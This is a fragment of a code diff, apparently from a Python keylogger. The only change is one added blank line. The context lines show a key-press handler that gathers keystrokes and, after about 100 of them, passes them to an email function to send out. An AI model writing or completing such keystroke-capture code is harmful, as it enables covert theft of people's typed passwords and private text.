@@ -23,6 +23,7 @@ def keyPressed(key):
             count += 1
         except:
             print("Error getting char")
+
         if (count > 100):
             count = 0
             email(keys)
